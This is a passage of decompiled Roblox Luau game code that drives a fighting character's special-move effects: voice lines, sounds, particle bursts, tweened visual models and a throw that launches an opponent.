                            _Sound15.Parent = _LocalPlayer3.Character.Torso
                            _Sound15.SoundId = 'rbxassetid://18445228824'

                            _Sound15:Play()

                            local u2298 = u766(true)

                            task.delay(6.584, function()
                                u2298:Play()
                            end)
                        end
                        local function u2319(p2300)
                            if p2300 then
                                task.delay(1.7, function()
                                    u1076('Fine.', 0.062)
                                    task.wait(1.4)
                                    u1076('Come as close as you like.', 0.062)
                                    task.wait(2.5)
                                    u1076('However...', 0.062)
                                    task.wait(1.4)
                                    u1076('This is the last time!', 0.043)
                                end)
                            end

                            u251()
                            u116()

                            local _Sound16 = Instance.new('Sound')

                            _Sound16.Volume = 4
                            _Sound16.TimePosition = 0.3
                            _Sound16.Parent = _LocalPlayer3.Character.Torso
                            _Sound16.SoundId = 'rbxassetid://17150550302'

                            _Sound16:Play()

                            local _Sound17 = Instance.new('Sound')

                            _Sound17.Volume = 2
                            _Sound17.TimePosition = 0.6
                            _Sound17.Parent = _LocalPlayer3.Character.Torso
                            _Sound17.SoundId = 'rbxassetid://17150550559'

                            _Sound17:Play()

                            local _rbxassetid17140902079 = u706('rbxassetid://17140902079', true)

                            _rbxassetid17140902079.Stopped:Connect(u131)

                            local v2304 = u4.Resources.KJEffects['fine...Emit']:Clone()

                            v2304.CFrame = _LocalPlayer3.Character.HumanoidRootPart.CFrame * CFrame.new(0, -0.5, 0)
                            v2304.Anchored = false
                            v2304.Parent = workspace.Thrown

                            local _Weld6 = Instance.new('Weld')

                            _Weld6.Part0 = _LocalPlayer3.Character.HumanoidRootPart
                            _Weld6.Part1 = v2304
                            _Weld6.Parent = v2304
                            _Weld6.C0 = CFrame.new(0, -0.5, 0)

                            local v2306, v2307, v2308 = pairs(v2304:GetDescendants())

                            while true do
                                local v2309

                                v2308, v2309 = v2306(v2307, v2308)

                                if v2308 == nil then
                                    break
                                end
                                if v2309:IsA('ParticleEmitter') then
                                    task.wait()
                                    v2309:Emit(v2309:GetAttribute('EmitCount'))
                                end
                            end

                            u6:AddItem(v2304, 3)

                            local u2310 = tick()

                            _rbxassetid17140902079:GetMarkerReachedSignal('ParticleActivate'):Connect(function()
                                local v2311 = u4.Resources.KJEffects['fine...1']:Clone()

                                v2311.CFrame = _LocalPlayer3.Character.HumanoidRootPart.CFrame * CFrame.new(0, -0.5, 0)
                                v2311.Anchored = false
                                v2311.Parent = workspace.Thrown

                                u6:AddItem(v2311, 8.1 - (tick() - u2310))

                                local _Weld7 = Instance.new('Weld')

                                _Weld7.Part0 = _LocalPlayer3.Character.HumanoidRootPart
                                _Weld7.Part1 = v2311
                                _Weld7.Parent = v2311
                            end)
                            _rbxassetid17140902079:GetMarkerReachedSignal('AwakenFinale'):Connect(function()
                                u766()

                                local v2313 = game.ReplicatedStorage.Resources.KJEffects['fine...Emit2']:Clone()

                                v2313.CFrame = _LocalPlayer3.Character.HumanoidRootPart.CFrame
                                v2313.Parent = workspace.Thrown
                                v2313.CanCollide = false
                                v2313.Anchored = false

                                local _Weld8 = Instance.new('Weld')

                                _Weld8.Part0 = _LocalPlayer3.Character.HumanoidRootPart
                                _Weld8.Part1 = v2313
                                _Weld8.Parent = v2313

                                local v2315, v2316, v2317 = pairs(v2313:GetDescendants())

                                while true do
                                    local v2318

                                    v2317, v2318 = v2315(v2316, v2317)

                                    if v2317 == nil then
                                        break
                                    end
                                    if v2318:IsA('ParticleEmitter') then
                                        task.wait()
                                        v2318:Emit(v2318:GetAttribute('EmitCount'))
                                    end
                                end

                                u6:AddItem(v2313, 3)
                            end)
                        end
                        local function u2526(p2320)
                            u122()

                            local u2321 = u706(u1077.SpiralingStorm.Startup, true)

                            p2320.HumanoidRootPart.CFrame = u113().CFrame * CFrame.new(0, 0, -2) * CFrame.Angles(0, math.rad(180), 0)

                            local u2322 = u60(p2320.HumanoidRootPart, u113(), nil, CFrame.new(0, 0, -2) * CFrame.Angles(0, math.rad(180), 0))

                            local function u2507(p2323)
                                local _KJThrow = game.ReplicatedStorage.Resources.KJThrow
                                local _, v2325 = u745(_KJThrow, {}, 10)
                                local _Char = p2323.Char
                                local _ = p2323.Victim
                                local _ = workspace.Thrown
                                local _wait = task.wait
                                local _PrimaryPart6 = _Char.PrimaryPart

                                Random.new()

                                if p2323.Spin then
                                    local u2329 = _PrimaryPart6
                                    local u2330 = _wait
                                    local u2331 = _KJThrow
                                    local u2332 = v2325

                                    local function v2439()
                                        local _Position5 = u2329.Position
                                        local _, v2334 = workspace:FindFirstChildOfClass('Camera'):WorldToScreenPoint(_Position5)
                                        local u2335 = v2334
                                        local u2336 = {}
                                        local u2337 = -5

                                        task.spawn(function()
                                            if u2335 then
                                                local v2338 = tick()

                                                while tick() - v2338 < 4 do
                                                    local v2339, v2340, v2341 = pairs(u2336)

                                                    while true do
                                                        local v2342

                                                        v2341, v2342 = v2339(v2340, v2341)

                                                        if v2341 == nil then
                                                            break
                                                        end

                                                        v2342.PrimaryPart.CFrame = v2342.PrimaryPart.CFrame * CFrame.Angles(0, 0, (math.rad(u2337)))
                                                        v2342.PrimaryPart.Position = u2329.CFrame * CFrame.new(0, 0, -1).Position - Vector3.new(0, u2329.Size.Y * 1.5, 0)
                                                    end

                                                    u2330(0.01)
                                                end
                                            end
                                        end)
                                        task.spawn(function()
                                            local v2343 = u340({
                                                FX = u2331.Spinning,
                                                Anchor = u2329.CFrame * CFrame.new(0, -u2329.Size.Y * 1.5, 0) * CFrame.Angles(1.5707963267948966, 0, 0),
                                                Maid = u2332._maid,
                                            })

                                            game.Debris:AddItem(v2343, 5)
                                            u424({
                                                FX = v2343,
                                                On = true,
                                            })
                                            v2343:ScaleTo(0.7)
                                            table.insert(u2336, v2343)

                                            for v2344 = 1, 12 do
                                                if u2335 then
                                                    local v2345 = v2344 * 0.01
                                                    local v2346 = u2331.TestWind2:Clone()

                                                    game.Debris:AddItem(v2346, 5)
                                                    v2346:ScaleTo(0.45 + v2345)

                                                    local u2347 = {
                                                        Model = v2346,
                                                        Anchor = u2329.CFrame * CFrame.new(0, -1, -1) * CFrame.Angles(0, -0.7853981633974483, 1.5707963267948966),
                                                        Info = TweenInfo.new(0.4, Enum.EasingStyle.Sine),
                                                    }

                                                    task.spawn(function()
                                                        local _Model14 = u2347.Model
                                                        local u2349 = u2347.Info or TweenInfo.new(1, Enum.EasingStyle.Sine)
                                                        local _Start13 = _Model14:FindFirstChild('Start')
                                                        local _End13 = _Model14:FindFirstChild('End')
                                                        local _Stay13 = u2347.Stay
                                                        local _Anchor14 = u2347.Anchor
                                                        local u2354 = u2347.EndT or 1
                                                        local _Del13 = u2347.Del
                                                        local _Skip13 = u2347.Skip

                                                        if _Start13 and _End13 then
                                                            _Model14.PrimaryPart = _Start13

                                                            if not _Skip13 then
                                                                local v2357, v2358, v2359 = pairs(_Model14:GetChildren())

                                                                while true do
                                                                    local v2360, v2361 = v2357(v2358, v2359)

                                                                    if v2360 == nil then
                                                                        break
                                                                    end

                                                                    v2359 = v2360

                                                                    if v2361:IsA('BasePart') then
                                                                        v2361.CanCollide = false
                                                                        v2361.Anchored = true
                                                                    end
                                                                end
                                                            end
                                                            if _Anchor14 then
                                                                _Model14:SetPrimaryPartCFrame(_Anchor14)
                                                            end
                                                            if u2347.T then
                                                                _Start13.Transparency = u2347.T
                                                            end

                                                            _End13.Transparency = 1
                                                            _Model14.Parent = workspace.Thrown

                                                            local _Decal19 = _Start13:FindFirstChildOfClass('Decal')
                                                            local _SpecialMesh28 = _Start13:FindFirstChildOfClass('SpecialMesh')
                                                            local _SpecialMesh29 = _End13:FindFirstChildOfClass('SpecialMesh')
                                                            local _Decal20 = _End13:FindFirstChildOfClass('Decal')

                                                            if _Decal20 and not _Skip13 then
                                                                _Decal20.Transparency = 1
                                                            end

                                                            local u2366 = u10

                                                            if _Del13 then
                                                                u10:Create(_Start13, u2349, {
                                                                    Size = _End13.Size,
                                                                    CFrame = _End13.CFrame,
                                                                }):Play()
                                                                task.delay(_Del13, function()
                                                                    u2366:Create(_Start13, u2349, {Transparency = u2354})
                                                                    u2366:Play()

                                                                    if _Decal19 then
                                                                        local v2367 = _Start13
                                                                        local v2368, v2369, v2370 = pairs(v2367:GetChildren())

                                                                        while true do
                                                                            local v2371

                                                                            v2370, v2371 = v2368(v2369, v2370)

                                                                            if v2370 == nil then
                                                                                break
                                                                            end
                                                                            if v2371:IsA('Decal') then
                                                                                u10:Create(v2371, u2349, {Transparency = u2354}):Play()
                                                                            end
                                                                        end
                                                                    end
                                                                    if _SpecialMesh28 then
                                                                        u2366:Create(_SpecialMesh28, u2349, {
                                                                            Scale = _SpecialMesh29.Scale,
                                                                        }):Play()
                                                                    end
                                                                end)
                                                            else
                                                                if _SpecialMesh28 then
                                                                    u10:Create(_SpecialMesh28, u2349, {
                                                                        Scale = _SpecialMesh29.Scale,
                                                                    }):Play()
                                                                end
                                                                if _Decal19 then
                                                                    local v2372, v2373, v2374 = pairs(_Start13:GetChildren())

                                                                    while true do
                                                                        local v2375

                                                                        v2374, v2375 = v2372(v2373, v2374)

                                                                        if v2374 == nil then
                                                                            break
                                                                        end
                                                                        if v2375:IsA('Decal') then
                                                                            u10:Create(v2375, u2349, {Transparency = u2354}):Play()
                                                                        end
                                                                    end

                                                                    u2366 = u2366:Create(_Start13, u2349, {
                                                                        Size = _End13.Size,
                                                                        CFrame = _End13.CFrame,
                                                                    })

                                                                    u2366:Play()
                                                                else
                                                                    u2366 = u2366:Create(_Start13, u2349, {
                                                                        Size = _End13.Size,
                                                                        Transparency = u2354,
                                                                        CFrame = _End13.CFrame,
                                                                    })

                                                                    u2366:Play()
                                                                end
                                                            end
                                                            if not _Stay13 then
                                                                if _Del13 then
                                                                    task.wait(_Del13 + 0.1)
                                                                end

                                                                u2366.Completed:Connect(function()
                                                                    _Model14:Destroy()
                                                                end)
                                                            end
                                                        end
                                                    end)

                                                    if v2344 > 2 then
                                                        local v2376 = u2331.TEst:Clone()

                                                        game.Debris:AddItem(v2376, 5)
                                                        v2376:ScaleTo(1 + v2345)

                                                        local u2377 = {
                                                            Model = v2376,
                                                            Anchor = u2329.CFrame * CFrame.new(0, -1, -1) * CFrame.Angles(0, -0.7853981633974483, 0),
                                                            Info = TweenInfo.new(0.8, Enum.EasingStyle.Sine),
                                                        }

                                                        task.spawn(function()
                                                            local _Model15 = u2377.Model
                                                            local u2379 = u2377.Info or TweenInfo.new(1, Enum.EasingStyle.Sine)
                                                            local _Start14 = _Model15:FindFirstChild('Start')
                                                            local _End14 = _Model15:FindFirstChild('End')
                                                            local _Stay14 = u2377.Stay
                                                            local _Anchor15 = u2377.Anchor
                                                            local u2384 = u2377.EndT or 1
                                                            local _Del14 = u2377.Del
                                                            local _Skip14 = u2377.Skip

                                                            if _Start14 and _End14 then
                                                                _Model15.PrimaryPart = _Start14

                                                                if not _Skip14 then
                                                                    local v2387, v2388, v2389 = pairs(_Model15:GetChildren())

                                                                    while true do
                                                                        local v2390, v2391 = v2387(v2388, v2389)

                                                                        if v2390 == nil then
                                                                            break
                                                                        end

                                                                        v2389 = v2390

                                                                        if v2391:IsA('BasePart') then
                                                                            v2391.CanCollide = false
                                                                            v2391.Anchored = true
                                                                        end
                                                                    end
                                                                end
                                                                if _Anchor15 then
                                                                    _Model15:SetPrimaryPartCFrame(_Anchor15)
                                                                end
                                                                if u2377.T then
                                                                    _Start14.Transparency = u2377.T
                                                                end

                                                                _End14.Transparency = 1
                                                                _Model15.Parent = workspace.Thrown

                                                                local _Decal21 = _Start14:FindFirstChildOfClass('Decal')
                                                                local _SpecialMesh30 = _Start14:FindFirstChildOfClass('SpecialMesh')
                                                                local _SpecialMesh31 = _End14:FindFirstChildOfClass('SpecialMesh')
                                                                local _Decal22 = _End14:FindFirstChildOfClass('Decal')

                                                                if _Decal22 and not _Skip14 then
                                                                    _Decal22.Transparency = 1
                                                                end

                                                                local u2396 = u10

                                                                if _Del14 then
                                                                    u10:Create(_Start14, u2379, {
                                                                        Size = _End14.Size,
                                                                        CFrame = _End14.CFrame,
                                                                    }):Play()
                                                                    task.delay(_Del14, function()
                                                                        u2396:Create(_Start14, u2379, {Transparency = u2384})
                                                                        u2396:Play()

                                                                        if _Decal21 then
                                                                            local v2397 = _Start14
                                                                            local v2398, v2399, v2400 = pairs(v2397:GetChildren())

                                                                            while true do
                                                                                local v2401

                                                                                v2400, v2401 = v2398(v2399, v2400)

                                                                                if v2400 == nil then
                                                                                    break
                                                                                end
                                                                                if v2401:IsA('Decal') then
                                                                                    u10:Create(v2401, u2379, {Transparency = u2384}):Play()
                                                                                end
                                                                            end
                                                                        end
                                                                        if _SpecialMesh30 then
                                                                            u2396:Create(_SpecialMesh30, u2379, {
                                                                                Scale = _SpecialMesh31.Scale,
                                                                            }):Play()
                                                                        end
                                                                    end)
                                                                else
                                                                    if _SpecialMesh30 then
                                                                        u10:Create(_SpecialMesh30, u2379, {
                                                                            Scale = _SpecialMesh31.Scale,
                                                                        }):Play()
                                                                    end
                                                                    if _Decal21 then
                                                                        local v2402, v2403, v2404 = pairs(_Start14:GetChildren())

                                                                        while true do
                                                                            local v2405

                                                                            v2404, v2405 = v2402(v2403, v2404)

                                                                            if v2404 == nil then
                                                                                break
                                                                            end
                                                                            if v2405:IsA('Decal') then
                                                                                u10:Create(v2405, u2379, {Transparency = u2384}):Play()
                                                                            end
                                                                        end

                                                                        u2396 = u2396:Create(_Start14, u2379, {
                                                                            Size = _End14.Size,
                                                                            CFrame = _End14.CFrame,
                                                                        })

                                                                        u2396:Play()
                                                                    else
                                                                        u2396 = u2396:Create(_Start14, u2379, {
                                                                            Size = _End14.Size,
                                                                            Transparency = u2384,
                                                                            CFrame = _End14.CFrame,
                                                                        })

                                                                        u2396:Play()
                                                                    end
                                                                end
                                                                if not _Stay14 then
                                                                    if _Del14 then
                                                                        task.wait(_Del14 + 0.1)
                                                                    end

                                                                    u2396.Completed:Connect(function()
                                                                        _Model15:Destroy()
                                                                    end)
                                                                end
                                                            end
                                                        end)
                                                    end
                                                end

                                                u2330(0.1)
                                            end

                                            local _Position6 = u2329.Position
                                            local _, v2407 = workspace:FindFirstChildOfClass('Camera'):WorldToScreenPoint(_Position6)

                                            if v2407 then
                                                local v2408 = u340({
                                                    FX = u2331.Toss,
                                                    Anchor = u2329.CFrame * CFrame.new(0, 0, -7) * CFrame.Angles(0, 0, 0),
                                                    Maid = u2332._maid,
                                                })

                                                game.Debris:AddItem(v2408, 5)
                                                u439(v2408)
                                                v2408:ScaleTo(1.3)

                                                u2337 = -0.5

                                                u424({
                                                    FX = v2343,
                                                    On = false,
                                                })

                                                local v2409 = u2331.Upwave2:Clone()

                                                game.Debris:AddItem(v2409, 5)
                                                v2409:ScaleTo(0.7)

                                                local u2410 = {
                                                    Model = v2409,
                                                    Anchor = u2329.CFrame * CFrame.Angles(0, 1.5707963267948966, 0),
                                                    Info = TweenInfo.new(0.3, Enum.EasingStyle.Sine),
                                                }

                                                task.spawn(function()
                                                    local _Model16 = u2410.Model
                                                    local u2412 = u2410.Info or TweenInfo.new(1, Enum.EasingStyle.Sine)
                                                    local _Start15 = _Model16:FindFirstChild('Start')
                                                    local _End15 = _Model16:FindFirstChild('End')
                                                    local _Stay15 = u2410.Stay
                                                    local _Anchor16 = u2410.Anchor
                                                    local u2417 = u2410.EndT or 1
                                                    local _Del15 = u2410.Del
                                                    local _Skip15 = u2410.Skip

                                                    if _Start15 and _End15 then
                                                        _Model16.PrimaryPart = _Start15

                                                        if not _Skip15 then
                                                            local v2420, v2421, v2422 = pairs(_Model16:GetChildren())

                                                            while true do
                                                                local v2423, v2424 = v2420(v2421, v2422)

                                                                if v2423 == nil then
                                                                    break
                                                                end

                                                                v2422 = v2423

                                                                if v2424:IsA('BasePart') then
                                                                    v2424.CanCollide = false
                                                                    v2424.Anchored = true
                                                                end
                                                            end
                                                        end
                                                        if _Anchor16 then
                                                            _Model16:SetPrimaryPartCFrame(_Anchor16)
                                                        end
                                                        if u2410.T then
                                                            _Start15.Transparency = u2410.T
                                                        end

                                                        _End15.Transparency = 1
                                                        _Model16.Parent = workspace.Thrown

                                                        local _Decal23 = _Start15:FindFirstChildOfClass('Decal')
                                                        local _SpecialMesh32 = _Start15:FindFirstChildOfClass('SpecialMesh')
                                                        local _SpecialMesh33 = _End15:FindFirstChildOfClass('SpecialMesh')
                                                        local _Decal24 = _End15:FindFirstChildOfClass('Decal')

                                                        if _Decal24 and not _Skip15 then
                                                            _Decal24.Transparency = 1
                                                        end

                                                        local u2429 = u10

                                                        if _Del15 then
                                                            u10:Create(_Start15, u2412, {
                                                                Size = _End15.Size,
                                                                CFrame = _End15.CFrame,
                                                            }):Play()
                                                            task.delay(_Del15, function()
                                                                u2429:Create(_Start15, u2412, {Transparency = u2417})
                                                                u2429:Play()

                                                                if _Decal23 then
                                                                    local v2430 = _Start15
                                                                    local v2431, v2432, v2433 = pairs(v2430:GetChildren())

                                                                    while true do
                                                                        local v2434

                                                                        v2433, v2434 = v2431(v2432, v2433)

                                                                        if v2433 == nil then
                                                                            break
                                                                        end
                                                                        if v2434:IsA('Decal') then
                                                                            u10:Create(v2434, u2412, {Transparency = u2417}):Play()
                                                                        end
                                                                    end
                                                                end
                                                                if _SpecialMesh32 then
                                                                    u2429:Create(_SpecialMesh32, u2412, {
                                                                        Scale = _SpecialMesh33.Scale,
                                                                    }):Play()
                                                                end
                                                            end)
                                                        else
                                                            if _SpecialMesh32 then
                                                                u10:Create(_SpecialMesh32, u2412, {
                                                                    Scale = _SpecialMesh33.Scale,
                                                                }):Play()
                                                            end
                                                            if _Decal23 then
                                                                local v2435, v2436, v2437 = pairs(_Start15:GetChildren())

                                                                while true do
                                                                    local v2438

                                                                    v2437, v2438 = v2435(v2436, v2437)

                                                                    if v2437 == nil then
                                                                        break
                                                                    end
                                                                    if v2438:IsA('Decal') then
                                                                        u10:Create(v2438, u2412, {Transparency = u2417}):Play()
                                                                    end
                                                                end

                                                                u2429 = u2429:Create(_Start15, u2412, {
                                                                    Size = _End15.Size,
                                                                    CFrame = _End15.CFrame,
                                                                })

                                                                u2429:Play()
                                                            else
                                                                u2429 = u2429:Create(_Start15, u2412, {
                                                                    Size = _End15.Size,
                                                                    Transparency = u2417,
                                                                    CFrame = _End15.CFrame,
                                                                })

                                                                u2429:Play()
                                                            end
                                                        end
                                                        if not _Stay15 then
                                                            if _Del15 then
                                                                task.wait(_Del15 + 0.1)
                                                            end

                                                            u2429.Completed:Connect(function()
                                                                _Model16:Destroy()
                                                            end)
                                                        end
                                                    end
                                                end)
                                            end
                                        end)
                                    end

                                    task.spawn(v2439)
                                else
                                    local u2440 = _KJThrow
                                    local u2441 = v2325
                                    local u2442 = _PrimaryPart6
                                    local u2443 = _wait

                                    local function v2506()
                                        local v2444 = u340({
                                            FX = u2440.swing,
                                            Maid = u2441._maid,
                                            Anchor = u2442.CFrame * CFrame.new(0, 0, -1.5) * CFrame.Angles(0, 1.5707963267948966, 0),
                                        })

                                        game.Debris:AddItem(v2444, 5)
                                        u246({
                                            FX = v2444,
                                            Scale = 2,
                                        })
                                        u439(v2444)

                                        local v2445 = u2440.HitThing:Clone()

                                        game.Debris:AddItem(v2445, 5)
                                        v2445:ScaleTo(0.6)

                                        local u2446 = {
                                            Model = v2445,
                                            Anchor = u2442.CFrame * CFrame.new(0, 0, 2) * CFrame.Angles(0, -2.9670597283903604, 0),
                                            Info = TweenInfo.new(0.8, Enum.EasingStyle.Exponential),
                                        }

                                        task.spawn(function()
                                            local _Model17 = u2446.Model
                                            local u2448 = u2446.Info or TweenInfo.new(1, Enum.EasingStyle.Sine)
                                            local _Start16 = _Model17:FindFirstChild('Start')
                                            local _End16 = _Model17:FindFirstChild('End')
                                            local _Stay16 = u2446.Stay
                                            local _Anchor17 = u2446.Anchor
                                            local u2453 = u2446.EndT or 1
                                            local _Del16 = u2446.Del
                                            local _Skip16 = u2446.Skip

                                            if _Start16 and _End16 then
                                                _Model17.PrimaryPart = _Start16

                                                if not _Skip16 then
                                                    local v2456, v2457, v2458 = pairs(_Model17:GetChildren())

                                                    while true do
                                                        local v2459, v2460 = v2456(v2457, v2458)

                                                        if v2459 == nil then
                                                            break
                                                        end

                                                        v2458 = v2459

                                                        if v2460:IsA('BasePart') then
                                                            v2460.CanCollide = false
                                                            v2460.Anchored = true
                                                        end
                                                    end
                                                end
                                                if _Anchor17 then
                                                    _Model17:SetPrimaryPartCFrame(_Anchor17)
                                                end
                                                if u2446.T then
                                                    _Start16.Transparency = u2446.T
                                                end

                                                _End16.Transparency = 1
                                                _Model17.Parent = workspace.Thrown

                                                local _Decal25 = _Start16:FindFirstChildOfClass('Decal')
                                                local _SpecialMesh34 = _Start16:FindFirstChildOfClass('SpecialMesh')
                                                local _SpecialMesh35 = _End16:FindFirstChildOfClass('SpecialMesh')
                                                local _Decal26 = _End16:FindFirstChildOfClass('Decal')

                                                if _Decal26 and not _Skip16 then
                                                    _Decal26.Transparency = 1
                                                end

                                                local u2465 = u10

                                                if _Del16 then
                                                    u10:Create(_Start16, u2448, {
                                                        Size = _End16.Size,
                                                        CFrame = _End16.CFrame,
                                                    }):Play()
                                                    task.delay(_Del16, function()
                                                        u2465 = u2465:Create(_Start16, u2448, {Transparency = u2453})

                                                        u2465:Play()

                                                        if _Decal25 then
                                                            local v2466 = _Start16
                                                            local v2467, v2468, v2469 = pairs(v2466:GetChildren())

                                                            while true do
                                                                local v2470

                                                                v2469, v2470 = v2467(v2468, v2469)

                                                                if v2469 == nil then
                                                                    break
                                                                end
                                                                if v2470:IsA('Decal') then
                                                                    u10:Create(v2470, u2448, {Transparency = u2453}):Play()
                                                                end
                                                            end
                                                        end
                                                        if _SpecialMesh34 then
                                                            u2465:Create(_SpecialMesh34, u2448, {
                                                                Scale = _SpecialMesh35.Scale,
                                                            }):Play()
                                                        end
                                                    end)
                                                else
                                                    if _SpecialMesh34 then
                                                        u10:Create(_SpecialMesh34, u2448, {
                                                            Scale = _SpecialMesh35.Scale,
                                                        }):Play()
                                                    end
                                                    if _Decal25 then
                                                        local v2471, v2472, v2473 = pairs(_Start16:GetChildren())

                                                        while true do
                                                            local v2474

                                                            v2473, v2474 = v2471(v2472, v2473)

                                                            if v2473 == nil then
                                                                break
                                                            end
                                                            if v2474:IsA('Decal') then
                                                                u10:Create(v2474, u2448, {Transparency = u2453}):Play()
                                                            end
                                                        end

                                                        u2465 = u2465:Create(_Start16, u2448, {
                                                            Size = _End16.Size,
                                                            CFrame = _End16.CFrame,
                                                        })

                                                        u2465:Play()
                                                    else
                                                        u2465 = u2465:Create(_Start16, u2448, {
                                                            Size = _End16.Size,
                                                            Transparency = u2453,
                                                            CFrame = _End16.CFrame,
                                                        })

                                                        u2465:Play()
                                                    end
                                                end
                                                if not _Stay16 then
                                                    if _Del16 then
                                                        task.wait(_Del16 + 0.1)
                                                    end

                                                    u2465.Completed:Connect(function()
                                                        _Model17:Destroy()
                                                    end)
                                                end
                                            end
                                        end)
                                        u2443(0.3)

                                        local v2475 = u340({
                                            FX = u2440.HiT,
                                            Maid = u2441._maid,
                                            Anchor = u2442.CFrame * CFrame.new(-1, 0, -0.5) * CFrame.Angles(0, -1.1344640137963142, 0),
                                        })

                                        game.Debris:AddItem(v2475, 5)
                                        u246({
                                            FX = v2475,
                                            Scale = 1,
                                        })
                                        u439(v2475)
                                        u2443(0.1)

                                        local v2476 = u2440.UpWave:Clone()

                                        game.Debris:AddItem(v2476, 5)
                                        v2476:ScaleTo(0.5)

                                        local u2477 = {
                                            Model = v2476,
                                            Anchor = v2475.PrimaryPart.CFrame * CFrame.Angles(0, 1.9198621771937625, 0),
                                            Info = TweenInfo.new(0.5, Enum.EasingStyle.Exponential),
                                        }

                                        task.spawn(function()
                                            local _Model18 = u2477.Model
                                            local u2479 = u2477.Info or TweenInfo.new(1, Enum.EasingStyle.Sine)
                                            local _Start17 = _Model18:FindFirstChild('Start')
                                            local _End17 = _Model18:FindFirstChild('End')
                                            local _Stay17 = u2477.Stay
                                            local _Anchor18 = u2477.Anchor
                                            local u2484 = u2477.EndT or 1
                                            local _Del17 = u2477.Del
                                            local _Skip17 = u2477.Skip

                                            if _Start17 and _End17 then
                                                _Model18.PrimaryPart = _Start17

                                                if not _Skip17 then
                                                    local v2487, v2488, v2489 = pairs(_Model18:GetChildren())

                                                    while true do
                                                        local v2490, v2491 = v2487(v2488, v2489)

                                                        if v2490 == nil then
                                                            break
                                                        end

                                                        v2489 = v2490

                                                        if v2491:IsA('BasePart') then
                                                            v2491.CanCollide = false
                                                            v2491.Anchored = true
                                                        end
                                                    end
                                                end
                                                if _Anchor18 then
                                                    _Model18:SetPrimaryPartCFrame(_Anchor18)
                                                end
                                                if u2477.T then
                                                    _Start17.Transparency = u2477.T
                                                end

                                                _End17.Transparency = 1
                                                _Model18.Parent = workspace.Thrown

                                                local _Decal27 = _Start17:FindFirstChildOfClass('Decal')
                                                local _SpecialMesh36 = _Start17:FindFirstChildOfClass('SpecialMesh')
                                                local _SpecialMesh37 = _End17:FindFirstChildOfClass('SpecialMesh')
                                                local _Decal28 = _End17:FindFirstChildOfClass('Decal')

                                                if _Decal28 and not _Skip17 then
                                                    _Decal28.Transparency = 1
                                                end

                                                local u2496 = u10

                                                if _Del17 then
                                                    u10:Create(_Start17, u2479, {
                                                        Size = _End17.Size,
                                                        CFrame = _End17.CFrame,
                                                    }):Play()
                                                    task.delay(_Del17, function()
                                                        u2496 = u2496:Create(_Start17, u2479, {Transparency = u2484})

                                                        u2496:Play()

                                                        if _Decal27 then
                                                            local v2497 = _Start17
                                                            local v2498, v2499, v2500 = pairs(v2497:GetChildren())

                                                            while true do
                                                                local v2501

                                                                v2500, v2501 = v2498(v2499, v2500)

                                                                if v2500 == nil then
                                                                    break
                                                                end
                                                                if v2501:IsA('Decal') then
                                                                    u10:Create(v2501, u2479, {Transparency = u2484}):Play()
                                                                end
                                                            end
                                                        end
                                                        if _SpecialMesh36 then
                                                            u2496:Create(_SpecialMesh36, u2479, {
                                                                Scale = _SpecialMesh37.Scale,
                                                            }):Play()
                                                        end
                                                    end)
                                                else
                                                    if _SpecialMesh36 then
                                                        u10:Create(_SpecialMesh36, u2479, {
                                                            Scale = _SpecialMesh37.Scale,
                                                        }):Play()
                                                    end
                                                    if _Decal27 then
                                                        local v2502, v2503, v2504 = pairs(_Start17:GetChildren())

                                                        while true do
                                                            local v2505

                                                            v2504, v2505 = v2502(v2503, v2504)

                                                            if v2504 == nil then
                                                                break
                                                            end
                                                            if v2505:IsA('Decal') then
                                                                u10:Create(v2505, u2479, {Transparency = u2484}):Play()
                                                            end
                                                        end

                                                        u2496 = u2496:Create(_Start17, u2479, {
                                                            Size = _End17.Size,
                                                            CFrame = _End17.CFrame,
                                                        })

                                                        u2496:Play()
                                                    else
                                                        u2496 = u2496:Create(_Start17, u2479, {
                                                            Size = _End17.Size,
                                                            Transparency = u2484,
                                                            CFrame = _End17.CFrame,
                                                        })

                                                        u2496:Play()
                                                    end
                                                end
                                                if not _Stay17 then
                                                    if _Del17 then
                                                        task.wait(_Del17 + 0.1)
                                                    end

                                                    u2496.Completed:Connect(function()
                                                        _Model18:Destroy()
                                                    end)
                                                end
                                            end
                                        end)
                                    end

                                    task.spawn(v2506)
                                end
                            end

                            local v2508 = u2321

                            u2321.GetMarkerReachedSignal(v2508, 'hit'):Connect(function()
                                shared.addshake(7)
                                u2507({
                                    Char = u201(),
                                    Spin = false,
                                    Victim = p2320,
                                })
                                task.wait(0.1)
                                u2322.Destroy()
                                game.Debris:AddItem(p2320, 2.65)

                                p2320.HumanoidRootPart.CFrame = u113().CFrame * CFrame.new(0, 0, -2)

                                local v2509 = p2320
                                local v2510, v2511, v2512 = pairs(v2509:GetChildren())

                                while true do
                                    local v2513, v2514 = v2510(v2511, v2512)

                                    if v2513 == nil then
                                        break
                                    end

                                    v2512 = v2513

                                    if v2514:IsA('BasePart') then
                                        v2514.CanCollide = false
                                    end
                                end

                                u60(p2320.HumanoidRootPart, u113(), 1.95, CFrame.Angles(0, math.rad(180), 0))
                                u2321:Stop()
                                shared.sfx({
                                    SoundId = 'rbxassetid://89085076665315',
                                    Parent = u201().Head,
                                    Volume = 1.649,
                                })
                                shared.sfx({
                                    SoundId = 'rbxassetid://71551755195386',
                                    Parent = p2320.Head,
                                    Volume = 1.649,
                                })

                                local u2515 = u706(u1077.SpiralingStorm.Victim, false, p2320)
                                local v2516 = u706(u1077.SpiralingStorm.Attacker, true)

                                v2516.Stopped:Connect(u131)
                                v2516:GetMarkerReachedSignal('throw'):Connect(function()
                                    u2515:Stop()
                                    shared.addshake(10)

                                    local _HumanoidRootPart7 = p2320:FindFirstChild('HumanoidRootPart')
                                    local v2518 = _HumanoidRootPart7.Position - u113().Position
                                    local _ = v2518.Magnitude
                                    local v2519 = v2518.Unit + Vector3.yAxis * 75 + Vector3.new(35, 0, 35)
                                    local _BodyGyro = Instance.new('BodyGyro')

                                    _BodyGyro.MaxTorque = Vector3.new(1, 1, 1) * _HumanoidRootPart7.AssemblyMass * 40000
                                    _BodyGyro.CFrame = CFrame.fromMatrix(Vector3.zero, -_HumanoidRootPart7.CFrame.RightVector, -v2519.Unit)
                                    _BodyGyro.P = 10000
                                    _BodyGyro.Parent = p2320.Head

                                    u6:AddItem(_BodyGyro, 0.1)

                                    local _BodyVelocity8 = Instance.new('BodyVelocity')

                                    _BodyVelocity8.MaxForce = Vector3.new(1, 1, 1) * _HumanoidRootPart7.AssemblyMass * 40000
                                    _BodyVelocity8.Velocity = v2519
                                    _BodyVelocity8.P = 10000
                                    _BodyVelocity8.Parent = p2320.Head

                                    u6:AddItem(_BodyVelocity8, 0.1)
                                end)

                                local u2522 = u113()
                                local u2523 = 35
